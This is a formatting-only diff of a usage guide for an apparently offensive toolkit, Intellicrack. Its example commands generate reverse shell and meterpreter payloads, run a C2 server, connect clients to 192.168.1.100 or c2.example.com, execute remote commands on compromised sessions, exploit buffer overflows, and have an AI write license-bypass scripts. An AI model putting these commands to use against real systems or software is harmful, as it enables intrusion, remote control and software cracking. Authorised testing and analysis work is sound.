@@ -5,6 +5,7 @@ This document provides practical examples of using the Intellicrack CLI with its
 ## Basic Analysis
 
 ### Vulnerability Scanning
+
 ```bash
 # Scan a binary for vulnerabilities
 python cli/cli.py scan binary.exe --vulns --output scan_results.json
@@ -17,6 +18,7 @@ python cli/cli.py analyze binary.exe --deep --output analysis.json
 ```
 
 ### Binary Analysis
+
 ```bash
 # Comprehensive analysis
 python cli/cli.py analyze binary.exe --mode comprehensive --verbose
@@ -31,6 +33,7 @@ python cli/cli.py analyze binary.exe --mode protection
 ## Payload Generation
 
 ### Generate Payloads
+
 ```bash
 # Generate a reverse shell payload
 python cli/cli.py payload generate --type reverse_shell --arch x64 --lhost 192.168.1.100 --lport 4444 --output payload.bin
@@ -43,6 +46,7 @@ python cli/cli.py payload generate --type meterpreter --arch x64 --lhost 10.0.0.
 ```
 
 ### Payload Templates
+
 ```bash
 # List available payload templates
 python cli/cli.py payload list-templates
@@ -54,6 +58,7 @@ python cli/cli.py payload from-template shell reverse_shell --arch x64 --param l
 ## Command and Control
 
 ### C2 Server
+
 ```bash
 # Start C2 server on default ports
 python cli/cli.py c2 server --host 0.0.0.0
@@ -66,6 +71,7 @@ python cli/cli.py c2 server --protocols https tcp --encryption aes256
 ```
 
 ### C2 Client
+
 ```bash
 # Connect to C2 server
 python cli/cli.py c2 client --server 192.168.1.100 --port 8443 --protocol https
@@ -75,6 +81,7 @@ python cli/cli.py c2 client --server c2.example.com --interval 300
 ```
 
 ### Remote Commands
+
 ```bash
 # List active sessions
 python cli/cli.py c2 exec list
@@ -89,6 +96,7 @@ python cli/cli.py c2 exec session_456 "cmd.exe" --interactive
 ## Exploitation
 
 ### Target Exploitation
+
 ```bash
 # Exploit a target with auto-detection
 python cli/cli.py exploit vulnerable.exe --type auto --payload custom_payload.bin
@@ -100,6 +108,7 @@ python cli/cli.py exploit target.exe --type buffer_overflow --payload buffer_ove
 ## AI Features
 
 ### Script Generation
+
 ```bash
 # Generate Frida script
 python cli/cli.py ai generate target.exe --script-type frida --focus license --output frida_script.js
@@ -109,6 +118,7 @@ python cli/cli.py ai generate binary.exe --script-type ghidra --complexity advan
 ```
 
 ### AI Analysis
+
 ```bash
 # AI-powered binary analysis
 python cli/cli.py ai analyze malware.exe --output ai_analysis.json --deep
@@ -118,6 +128,7 @@ python cli/cli.py ai test generated_script.js --binary target.exe
 ```
 
 ### Autonomous AI
+
 ```bash
 # Run autonomous analysis
 python cli/cli.py ai autonomous "Analyze this binary for vulnerabilities and generate bypass scripts"
@@ -126,6 +137,7 @@ python cli/cli.py ai autonomous "Analyze this binary for vulnerabilities and gen
 ## Advanced Workflows
 
 ### Complete Security Assessment
+
 ```bash
 # Run full security analysis pipeline
 python cli/cli.py scan target.exe --vulns --output vuln_scan.json
@@ -135,6 +147,7 @@ python cli/cli.py ai analyze target.exe --deep --output ai_insights.json
 ```
 
 ### C2 Operation Workflow
+
 ```bash
 # Set up C2 infrastructure
 python cli/cli.py c2 server --host 0.0.0.0 --protocols https tcp
@@ -148,6 +161,7 @@ python cli/cli.py c2 exec session_001 "net user" --interactive
 ```
 
 ### Payload Development
+
 ```bash
 # Generate and test payload
 python cli/cli.py payload generate --type reverse_shell --lhost 127.0.0.1 --lport 9001 --output test_payload.bin
@@ -160,6 +174,7 @@ python cli/cli.py payload from-template shell bind_shell --arch x64 --param lpor
 ## Integration Examples
 
 ### Batch Processing
+
 ```bash
 # Process multiple files
 # Create a text file with one binary path per line
@@ -171,6 +186,7 @@ echo "binary2.dll" >> batch_list.txt
 ```
 
 ### Output Formatting
+
 ```bash
 # JSON output for automation
 python cli/cli.py scan binary.exe --vulns --quiet --output results.json
@@ -182,12 +198,14 @@ python cli/cli.py analyze binary.exe --verbose --output debug.log
 ## Error Handling
 
 ### With Error Tolerance
+
 ```bash
 # Continue on errors where possible
 python cli/cli.py analyze problem_binary.exe --mode comprehensive || echo "Analysis completed with warnings"
 ```
 
 ### Debugging Issues
+
 ```bash
 # Enable verbose logging
 export INTELLICRACK_VERBOSE=1
